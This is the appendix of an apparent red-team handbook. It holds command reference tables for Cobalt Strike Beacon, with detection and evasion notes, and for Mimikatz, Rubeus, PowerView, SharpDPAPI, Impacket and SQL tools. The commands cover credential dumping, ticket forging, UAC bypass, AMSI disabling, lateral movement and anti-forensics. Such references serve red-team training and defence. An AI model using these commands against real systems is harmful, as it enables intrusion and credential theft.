# Part III — Appendices

## Appendix A — Beacon command reference

Syntax is Cobalt Strike Beacon (4.x). Commands marked ⚠ depend on the build or an installed kit/BOF.

### Session and control

| Command | Does | OPSEC |
|---|---|---|
| `sleep <seconds> [jitter%]` | Set check-in interval | Longer + jitter = quieter |
| `checkin` | Force an immediate check-in | Extra traffic; use sparingly |
| `getuid` | Current token user | 🟢 |
| `whoami` | Current user (alias) | 🟢 |
| `rev2self` | Drop impersonation | Do it after token work |
| `exit` | Terminate the beacon | Clean up when done |
| `note <text>` | Label the session | 🟢 helps you |
| `clear` | Clear output | Local only |
| `cancel` | Cancel a pending task | — |
| `job` | List long-running jobs | 🟢 |
| `jobkill <id>` | Kill a job | Clean up proxies/scans |
| `ps` | List processes | 🟢 in-memory |
| `kill <pid>` | Kill a process | Visible |
| `cd <dir>` / `pwd` | Change/print directory | 🟢 |
| `ls` | List files | 🟢 |
| `drives` | List drives | 🟢 |
| `reg query <key>` | Registry query | 4688 if shell-backed |

### Execution

| Command | Does | OPSEC |
|---|---|---|
| `run <cmd> [args]` | Run a program without `cmd.exe` | 🟢 quieter than `shell` |
| `shell <cmd> [args]` | Run via `cmd.exe` | 🔊 4688 + command line |
| `execute <cmd>` ⚠ | Execute a program (alias of `run` in some builds) | — |
| `execute-assembly <path> [args]` | Run .NET assembly in a sacrificial process | 🟢 preferred for tooling |
| `powerpick <cmd>` | PowerShell in-process, no `powershell.exe` | 🟢 |
| `powershell <cmd>` | Spawn `powershell.exe` | 🔊 4688/4104 |
| `powershell-import <file>` | Import a script for `powerpick` | Import once |
| `psinject <pid> <arch> <cmd>` | PowerShell in a remote process | Sysmon 8/10 |
| `runas <user> <pass> <cmd>` | Run as another user | 4648 |
| `spawnto x64 <path>` | Process for fork-and-run | Change from default |
| `blockdlls start|stop` | Block non-Microsoft DLLs in children | 🟢 |
| `ppid <pid>` | Set parent PID ⚠ | Lineage spoofing |
| `argue <cmd>` | Spoof process arguments ⚠ | — |

### Injection, spawning, pivoting

| Command | Does | OPSEC |
|---|---|---|
| `spawn <arch> <listener>` | New beacon in a new process | Parent lineage |
| `spawnas <user> <pass> <arch> <listener>` | Spawn as another user | 4648 |
| `inject <pid> <arch> <listener>` | Inject beacon into a process | Sysmon 8/10 |
| `shinject <pid> <arch> <file.bin>` | Inject shellcode | Sysmon 8 |
| `shspawn <arch> <file.bin>` | New process with shellcode | Sysmon 1 |
| `link <host> <pipe>` | Connect to an SMB beacon | 🟢 |
| `connect <host> <port>` | Connect to a TCP beacon | — |
| `unlink` | Disconnect a child | Clean up |
| `socks <port> [socks5 ...]` | SOCKS proxy | Use SOCKS5 |
| `socks stop` | Stop proxy | Clean up |
| `rportfwd <lport> <rhost> <rport>` | Reverse port forward | Opens a listener |
| `rportfwd stop <lport>` | Stop forward | Clean up |
| `rportfwd_local <lport> <rhost> <rport>` ⚠ | Local reverse forward | Opens a listener |
| `portscan <host> <ports>` | Port scan | Egress from beacon process |
| `ssh <user>@<host>` / `ssh-key` | SSH client ⚠ | — |
| `spunnel` / `spunnel_local` ⚠ | Spawn + tunnel | New process |

### Credentials and tokens

| Command | Does | OPSEC |
|---|---|---|
| `mimikatz <args>` | Run Mimikatz in a sacrificial process | 🔊 LSASS |
| `kerberos_ticket_list` | List Kerberos tickets | 🟢 |
| `kerberos_ticket_use <file>` | Use a ticket from file | — |
| `kerberos_ticket_purge` | Purge tickets | Cleanup |
| `hashdump` | Dump SAM hashes | 🔊 LSASS |
| `logonpasswords` | Dump LSASS logon passwords | 🔊🔊 |
| `dcsync <domain> <user>` | DCSync | 🔊 4662 |
| `make_token <dom\user> <pass>` | Netonly token | 4648 |
| `steal_token <pid>` | Steal a process token | Sysmon 10 |
| `token-store steal <pid>` | Save a token | 🟢 |
| `token-store show` | List saved tokens | 🟢 |
| `token-store use <id>` | Use a saved token | 🟢 |
| `token-store remove <id>` | Remove one | Cleanup |
| `token-store remove-all` | Remove all | Cleanup |
| `pth <dom\user> <ntlm>` | Pass-the-hash | 4624 type 3 |

### Collection

| Command | Does | OPSEC |
|---|---|---|
| `screenshot` | Screenshot | User-visible |
| `printscreen` | Screenshot (alias) | — |
| `clipboard` | Read clipboard | High-signal |
| `keylogger` | Start keylogger | 🔊 |
| `desktop` | VNC session ⚠ | Very visible |
| `browserpivot` | Browser pivot ⚠ | — |
| `timestomp <file> <time>` | Change timestamps | Anti-forensics; detectable |

### Files and transfer

| Command | Does | OPSEC |
|---|---|---|
| `upload <local> <remote>` | Upload file | Sysmon 11 |
| `download <remote>` | Download file | — |
| `rm <file>` | Delete file | Cleanup |
| `mkdir <dir>` | Create directory | — |
| `cp <src> <dst>` / `mv <src> <dst>` | Copy/move | — |

### Networking and discovery

| Command | Does | OPSEC |
|---|---|---|
| `net <subcommand>` | `net` commands | 4688 if shell-backed |
| `net logons` | Logged-on users | Medium |
| `net sessions` | SMB sessions | Medium |
| `net shares` | Shares | 🟢 |
| `net computers` | Domain computers | 🟢 |
| `wmic <query>` | WMI query | 4688 |
| `portscan` | Port scan | 🔇 |

### Elevation

| Command | Does | OPSEC |
|---|---|---|
| `getsystem` | SYSTEM via named-pipe impersonation | Medium |
| `elevate uac-schtasks <listener>` | UAC bypass via scheduled task | Artifacts |
| `elevate uac-token-duplication <listener>` | UAC token duplication | Artifacts |
| `elevate svc-exe <listener>` | Elevate via service (BOF) | 7045 |

### Remote execution

| Command | Does | OPSEC |
|---|---|---|
| `jump psexec <host> <listener>` | PsExec session | 🔊 service + binary |
| `jump psexec64 <host> <listener>` | x64 PsExec | 🔊 |
| `jump psexec_psh <host> <listener>` | PsExec via PowerShell | 🔊 |
| `jump winrm <host> <listener>` | WinRM session | Medium |
| `jump winrm64 <host> <listener>` | x64 WinRM | Medium |
| `jump ssh <host> <listener>` | SSH session | — |
| `remote-exec psexec <host> <cmd>` | Run command via PsExec | 🔊 |
| `remote-exec winrm <host> <cmd>` | Run command via WinRM | Medium |
| `remote-exec wmi <host> <cmd>` | Run command via WMI (no output returned) | Medium |

### Arsenal Kit / BOF extras

| Command | Does | Notes |
|---|---|---|
| `ak-settings` | Show/set Artifact Kit options | Rebuild after profile change |
| `amsi_disable` | Disable AMSI for `powerpick`, `execute-assembly`, `psinject` | ⚠ does **not** cover `powershell` |
| `PortBender` ⚠ | Port redirection BOF | Use for relay/port redirection |
| Custom BOFs | `inline-execute` / kit commands | Vary by kit |

---

## Appendix B — Tool reference

### B.1 Mimikatz (via Beacon)

| Command | Purpose |
|---|---|
| `!privilege::debug` | Acquire debug privilege |
| `!sekurlsa::logonpasswords` | Plaintext/NTLM/SHA1 for logon sessions |
| `!sekurlsa::ekeys` | Kerberos AES/RC4 keys |
| `!sekurlsa::tickets` | Tickets in memory |
| `!sekurlsa::dpapi` | DPAPI masterkeys in memory |
| `!sekurlsa::pth /user /domain /ntlm /run` | Pass-the-hash and run |
| `!lsadump::sam` | Local SAM |
| `!lsadump::secrets` | LSA secrets |
| `!lsadump::cache` | Cached domain credentials |
| `!lsadump::lsa /inject /name:krbtgt` | `krbtgt` keys (DC) |
| `!lsadump::dcsync /domain /user` | DCSync one principal |
| `!lsadump::dcsync /domain /all` | DCSync everything |
| `!lsadump::trust /patch` | Trust keys (⚠ not OPSEC-safe) |
| `!vault::list` | Credential Manager entries |
| `!vault::cred /patch` | Decrypt vault entries |
| `dpapi::cred /in:<file>` | Decrypt a credential blob |
| `dpapi::masterkey /in:<file> /rpc` | Decrypt a masterkey via DC |
| `dpapi::chrome /in:<file> /unprotect` | Browser secrets |
| `!crypto::certificates /export` | Export user certs |
| `!crypto::certificates /systemstore:local_machine /export` | Export machine certs |
| `kerberos::golden /user /domain /sid /krbtgt /ptt` | Golden ticket |
| `kerberos::golden /service:cifs /target:<host> /rc4 /sid /user /ptt` | Silver ticket |
| `!misc::skeleton` | Skeleton key (DC) |

**Prefixes:** `!` = elevate to SYSTEM; `@` = impersonate the beacon thread token; no prefix = current context.

### B.2 Rubeus

| Command | Purpose |
|---|---|
| `triage` | Summary of tickets per logon session |
| `klist` | List current tickets |
| `dump /luid:<id> /nowrap` | Dump tickets for a logon session |
| `ptt /ticket:<base64>` | Pass-the-ticket |
| `ptt /luid:<id> /ticket:<base64>` | PTT into a specific session |
| `purge` | Clear tickets |
| `describe /ticket:<base64>` | Decode a ticket |
| `monitor /interval:10 /nowrap` | Watch for new tickets |
| `kerberoast /user:<user> /nowrap` | Roast a user |
| `kerberoast /rc4opsec /nowrap` | Quiet Kerberoast |
| `kerberoast /format:hashcat /outfile:<f>` | Hashcat format |
| `asreproast /user:<user> /nowrap` | AS-REP roast |
| `asktgt /user /rc4|/aes256|/password /domain /dc /opsec /nowrap` | Get a TGT |
| `asktgs /service:<spn> /domain /dc /ticket:<tgt> /nowrap` | Get a service ticket |
| `s4u /user /rc4|/aes256 /impersonateuser /msdsspn /altservice /domain /dc /nowrap` | Constrained delegation |
| `createnetonly /program /domain /username /password [/ticket]` | Create a netonly logon session |
| `hash /password:<p> /user:<u> /domain:<d>` | Derive hashes/AES from a password |
| `golden /aes256 /user /domain /sid [/sids] /nowrap` | Golden ticket |
| `silver /service /aes256 /user /domain /sid /nowrap` | Silver ticket |
| `diamond /tgtdeleg /ticketuser /ticketuserid /groups /krbkey [/sids] /nowrap` | Diamond ticket |
| `tgtdeleg` | Obtain a usable TGT without a password |
| `renew` / `changepw` | Ticket renewal / password change ⚠ |
| `preauthscan` | Find pre-auth-disabled accounts ⚠ |

### B.3 PowerView (quick index)

```
Get-Domain, Get-DomainSID, Get-DomainController, Get-DomainPolicy
Get-DomainUser, Get-DomainGroup, Get-DomainGroupMember, Get-DomainComputer
Get-DomainOU, Get-DomainSite, Get-DomainSubnet, Get-DomainTrust, Get-Forest, Get-ForestTrust
Get-DomainObject, Get-DomainGPO, Get-ObjectAcl, Get-DomainObjectAcl
Find-InterestingDomainAcl, Invoke-ACLScanner
Find-LocalAdminAccess, Find-DomainUserLocation, Invoke-UserHunter
Invoke-ShareFinder, Invoke-FileFinder, Find-DomainShare, Find-InterestingDomainShareFile
Get-NetFileServer, Get-DomainFileServer, Get-DomainDFSShare
Get-NetLocalGroup, Get-NetLocalGroupMember, Get-NetSession, Get-NetLoggedon, Get-NetShare
ConvertFrom-SID, ConvertTo-SID
Set-DomainUserPassword, Add-DomainGroupMember, Add-DomainObjectAcl, Remove-DomainObjectAcl
Set-DomainObject, Set-DomainObjectOwner
New-GPO, New-GPLink, Get-GPO, Set-GPPrefRegistryValue
Get-DomainForeignGroupMember, Find-ForeignGroup, Find-ForeignUser
```

### B.4 SharpDPAPI

| Command | Purpose |
|---|---|
| `masterkeys` | User DPAPI masterkeys |
| `credentials` | User credential blobs |
| `vaults` | Credential Manager vaults |
| `rdg` | RDP saved credentials |
| `machinemasterkeys` | Machine masterkeys |
| `machinecredentials` | Machine credential blobs |
| `certificates /machine` | Machine certificates (CA keys) |

### B.5 Seatbelt

| Group | Contents |
|---|---|
| `-group=system` | OS, hotfixes, services, environment |
| `-group=user` | User, groups, privileges, creds |
| `-group=misc` | Misc (installed apps, firewall, etc.) |
| `-group=browser` | Browser data |
| `-group=all -full` | Everything (loud) |

### B.6 SharpUp

| Command | Purpose |
|---|---|
| `audit` | All privilege-escalation checks |
| `audit ModifiableServices` | Weak service permissions |
| `audit ModifiableScheduledTask` | Writable tasks |
| `audit UnquotedServicePath` | Unquoted paths |
| `audit AlwaysInstallElevated` | MSI policy |
| `audit TokenPrivileges` | Token privileges |

### B.7 SQL

| Tool / command | Purpose |
|---|---|
| `Get-SQLInstanceDomain` | Discover SQL SPNs |
| `Get-SQLConnectionTest -Instance <h>` | Test access |
| `Get-SQLServerInfo -Instance <h>` | Server info |
| `Get-SQLQuery -Instance <h> -Query "<sql>"` | Run a query |
| `Invoke-SQLOSCmd -Instance <h> -Command "<cmd>"` | OS command via xp_cmdshell |
| `Get-SQLServerLinkCrawl -Instance <h>` | Crawl linked servers |
| `SQLRecon /a:wintoken /h:<h> /m:whoami` | SQLRecon context |
| `SQLRecon /a:wintoken /h:<h> /m:query /c:"<sql>"` | SQLRecon query |
| `SQLRecon /a:wintoken /h:<h> /m:impersonate` | List impersonatable logins |
| `SQLRecon /a:wintoken /h:<h> /m:ixpcmd /i:<login> /c:<cmd>` | Impersonate + command |

### B.8 Impacket (Linux / operator side)

| Script | Purpose |
|---|---|
| `GetUserSPNs.py <dom>/<u>:<p> -dc-ip <dc> -request` | Kerberoast |
| `GetNPUsers.py <dom>/ -usersfile <f> -dc-ip <dc> -request` | AS-REP roast |
| `secretsdump.py <dom>/<u>:<p>@<dc>` | DCSync / hive parsing |
| `psexec.py <dom>/<u>:<p>@<host>` | PsExec |
| `wmiexec.py <dom>/<u>:<p>@<host>` | WMI |
| `smbexec.py` | SMB exec |
| `atexec.py` | Scheduled task |
| `dcomexec.py` | DCOM |
| `getTGT.py` / `getST.py` | TGT / service ticket |
| `ticketer.py` | Forge tickets |
| `ntlmrelayx.py` | NTLM relay |
| `smbserver.py` | Host files |

